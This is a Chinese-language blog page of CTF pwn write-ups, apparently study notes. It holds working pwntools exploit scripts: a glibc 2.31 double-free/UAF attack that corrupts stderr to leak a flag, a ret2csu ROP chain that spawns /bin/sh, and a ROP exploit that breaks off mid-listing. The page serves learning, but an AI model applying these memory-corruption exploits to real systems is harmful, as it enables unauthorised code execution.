<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="我的博客">
<meta property="og:type" content="website">
<meta property="og:title" content="study">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="我的博客">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/07/VNCTF-pwn1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/07/VNCTF-pwn1/" class="post-title-link" itemprop="url">VNCTF pwn1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-07 22:24:19 / 修改时间：22:57:56" itemprop="dateCreated datePublished" datetime="2022-03-07T22:24:19+08:00">2022-03-07</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="VNCTF-pwn1"><a href="#VNCTF-pwn1" class="headerlink" title="VNCTF pwn1"></a>VNCTF pwn1</h1><p>这道题鸽了有半个多月了，终于把他做完了，当时是全场零解的题，看官方wp的时候有200多行的代码，看得我头皮发麻，幸好后面找见了个比较简单的wp，但这个wp就是简略的说了一下过程，还有我没有见过的stderr利用（不懂为什么不可以使用stdout），后面实验一下</p>
<p>这道题的代码量挺少的，主要逻辑是两个数组储存对的地址和堆的大小，在申请的时候会对size数组遍历检查，如果为0在此处储存新堆块的大小，对应地址数组的偏移储存地址，在free的时候不会检查地址数组，只检查size数组，然后free完不会清除地址，只清除size,导致可以doublefree,如果申请的时候idx是指定的就很方便了，但是这个不是指定的，而是遍历size数组的，况且是2.31的glibc，单纯doublefree是不行的，我们得通过doublefree构造UAF，通过doublefree构造UAF的方式先free一次，在申请出来，然后再free一次，这样就构成了UAF，为了不覆盖堆地址，所以需要doublefree的idx在后面才行（当时没想到，笨）。</p>
<p>我感觉这道题的精华就是把一个堆同时放到tcache和unsortedbin上面，这样tcache的fd就有了libc地址了，然后使用UAF进行爆破（有leak就不用这么麻烦了）。</p>
<h2 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h2><p>先在flag附近申请一个指定的堆块，然后利用UAF打global_max_fast,然后把这个堆块free到stderr的write_base上面，再利用UAF打stderr，修改flag和write_base的最后一个字节，至于为什么要改，因为这个堆的地址大于储存flag的地址，所以得改小，最后修改topchunk的size的大小和prev_size(0),最后申请一个大堆块，就会触发io_new_file_xsputn,这个函数在stdout就介绍过了，里面有一个sys_write()函数，只要file结构体的flag满足条件就行，这样就有了io函数了，就能输出flag值了。</p>
<p>这是我写的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,context</span>):</span></span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x14b0</span>)<span class="comment">#0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x40</span>)<span class="comment">#1-7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x50</span>)<span class="comment">#8-14</span></span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x120</span>)<span class="comment">#17</span></span><br><span class="line">    add(<span class="number">0x440</span>)<span class="comment">#18</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">15</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#1-&gt;15</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">15</span>)</span><br><span class="line">        edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#fast-&gt;0x1eeb80     stderr-&gt;0x1ec5c0   </span></span><br><span class="line">    add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0xe0</span>)<span class="comment">#3</span></span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;\x80\xcb&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#5-&gt;16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">16</span>)</span><br><span class="line">        edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0xe0</span>)<span class="comment">#7</span></span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">&#x27;\xc0\xa5&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#8</span></span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">0x440</span>)<span class="comment">#9</span></span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)<span class="comment">#10</span></span><br><span class="line">    edit(<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x430</span>+p64(<span class="number">0</span>)+p64(<span class="number">123</span>))</span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#11</span></span><br><span class="line">    edit(<span class="number">11</span>,p64(<span class="number">0x7fffffffffff</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#0</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    edit(<span class="number">11</span>,p64(<span class="number">0x80</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    add(<span class="number">0x888</span>)</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>感觉对其中的调用链很模糊，再研究研究</p>
<h2 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h2><p>之前能使用stdout进行leak最主要的原因是puts函数调用了<code>_IO_file_xsputn</code>函数，而<code>_IO_file_xsputn</code>函数会最终会调用<code>io_overflow</code>函数，<code>io_overflow</code>函数最后又会调用<code>io_do_write</code>函数，<code>io_do_write</code>函数又会调用<code>new_do_write</code></p>
<p>注意上面的调用链是一定的，调用<code>_IO_file_xsputn</code>函数以后最后一定会调用<code>new_do_write</code>函数，而<code>new_do_wirte</code>函数就是我们要利用的地方</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span></span></span><br><span class="line"><span class="function">_IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用函数输出输出缓冲区</span></span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">//最终输出 </span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意有个write的系统调用，把data输出到fp，fp如果是stdout或者是stderr，那就相当于把data输出到屏幕，之前对flag的设置就是为了<code>new_do_write</code>函数能走到<code>_IO_SYSWRITE (fp, data, to_do)</code></p>
<p>这道题之所以不能用stdout是因为输出函数是write函数，没有调用<code>_IO_file_xsputn</code>函数</p>
<h2 id="stderr"><a href="#stderr" class="headerlink" title="stderr"></a>stderr</h2><p>经过gdb的调试我找见了脚本最后的调用链<code>malloc-&gt;_int_malloc-&gt;sysmalloc-&gt;__malloc_assert-&gt;__fxprintf-&gt;buffered_vfprintf-&gt;_IO_file_xsputn</code>,这就和上面的stdout泄露的调用链连上了，虽然找见了调用链但是过程不是很清晰，和houseofkiwi扯上关系了，以后再学习叭，现在夜深了。</p>
<p>我找见了进入<code>__malloc_assert</code>函数的源码,其中刷新stderr是利用的<code>__fxprintf</code>,<code>house of kiwi</code>使用的是<code>fflush(stderr)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __assert_fail(assertion, file, <span class="meta-keyword">line</span>, function)			\</span></span><br><span class="line"><span class="meta">	 __malloc_assert(assertion, file, <span class="meta-keyword">line</span>, function)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__malloc_assert (<span class="keyword">const</span> <span class="keyword">char</span> *assertion, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> line,</span><br><span class="line">		 <span class="keyword">const</span> <span class="keyword">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="keyword">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了会<code>house of kiwi</code>不算很难，可以专门学习一波。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当没有puts函数的时候，可以使用这个方法刷新srderr泄露信息，注意这种利用方式会导致程序退出，不适合泄露libc地址（除非没开aslr）。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/VNCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/02/VNCTF/" class="post-title-link" itemprop="url">VNCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-02 20:18:05 / 修改时间：20:18:35" itemprop="dateCreated datePublished" datetime="2022-03-02T20:18:05+08:00">2022-03-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="vnctf"><a href="#vnctf" class="headerlink" title="vnctf"></a>vnctf</h1><h2 id="clear-got"><a href="#clear-got" class="headerlink" title="clear_got"></a>clear_got</h2><p>刚开始泄露libc地址算基地址猜版本号本地能打通，远程不行，看了wp发现用了csu,自己复现时发现<code>call [r12+rbx*8]</code>这段代码不好搞，wp也很巧妙，使用了bss上面的一个地址（能读的也只有bss段，是我疏忽了，思路挺好想到的），最后我的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&#x27;node4.buuoj.cn&#x27;,26251)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    gdb.attach(sh,<span class="string">&#x27;b *0x400762&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///&#x27;</span>)</span><br><span class="line">    syscall_addr=<span class="number">0x000000000040077e</span></span><br><span class="line">    bss_addr=<span class="number">0x601000</span></span><br><span class="line">    gadget1=<span class="number">0x4007EA</span></span><br><span class="line">    gadget2=<span class="number">0x4007D0</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(gadget1)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">    payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">    payload+=p64(<span class="number">0x600e40</span>)<span class="comment">#r12</span></span><br><span class="line">    payload+=p64(<span class="number">0x3b</span>)<span class="comment">#r13-&gt;rdx</span></span><br><span class="line">    payload+=p64(bss_addr)<span class="comment">#r14-&gt;rsi</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r15-&gt;edi</span></span><br><span class="line">    payload+=p64(gadget2)</span><br><span class="line">    payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">    payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">    payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#r12</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r13-&gt;rdx</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r14-&gt;rsi</span></span><br><span class="line">    payload+=p64(bss_addr)<span class="comment">#r15-&gt;edi</span></span><br><span class="line">    payload+=p64(syscall_addr)</span><br><span class="line">    payload+=p64(gadget2)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    m=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)</span><br><span class="line">    m=m.ljust(<span class="number">0x3b</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    sh.send(m)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br><span class="line"><span class="comment">#flag&#123;0f3a2cff-55bb-4517-a7f9-d91daf946d32&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>tcp服务的模拟，他会检查上传的tcp报文的格式，传数据的时候得绕过这个检查，然后会把传上来的数据拷贝到栈上，造成了栈溢出，远程环境很容易崩，多试几次，这也是我比赛期间内唯一做出来的题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28714</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">main_addr=<span class="number">0x401A5E</span></span><br><span class="line">bss_addr=<span class="number">0x404000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000401bb3: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x0000000000401bb1: pop rsi; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">x000000000004a550: pop rax; ret;</span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; 